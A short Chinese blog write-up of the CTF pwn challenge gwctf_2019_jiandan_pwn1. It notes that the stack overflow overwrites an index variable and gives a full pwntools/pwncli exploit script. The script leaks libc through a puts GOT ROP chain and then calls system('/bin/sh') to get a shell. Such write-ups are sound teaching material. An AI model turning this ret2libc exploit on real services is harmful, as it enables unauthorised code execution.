# gwctf_2019_jiandan_pwn1



### 总结

题如其名，虽然简单，但是有个小坑，就是栈溢出的过程中，会把索引给覆盖掉，所以要注意索引的值：

![image-20210820232921096](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210820232921096.png)

即这里的`v4`为索引，在`rbp`的下方，溢出的时候注意一下即可。

<!-- more -->

### Exp

```python
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc:ELF = gift['libc']

payload = flat([b"a"*(0x110 - 4), p32(0x10d), 0, 0x0000000000400843, elf.got['puts'], elf.plt['puts'], 0x400790])

p.sendlineafter("Hack 4 fun!\n", payload)

msg = p.recvline()
libc_base_addr = u64(msg[:-1].ljust(8, b"\x00")) - libc.sym['puts']
log_address("libc_base_addr", libc_base_addr)

libc.address = libc_base_addr

# sleep(1)
payload = flat([b"b"*(0x110 - 4), p32(0x10d), 0xdeadbeef, 0x400843, libc.search(b"/bin/sh").__next__(), libc.sym['system']])
p.sendlineafter("Hack 4 fun!\n", payload)


p.interactive()
```

### 引用与参考
1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2021-08-20-gwctf-2019-jiandan-pwn1/  

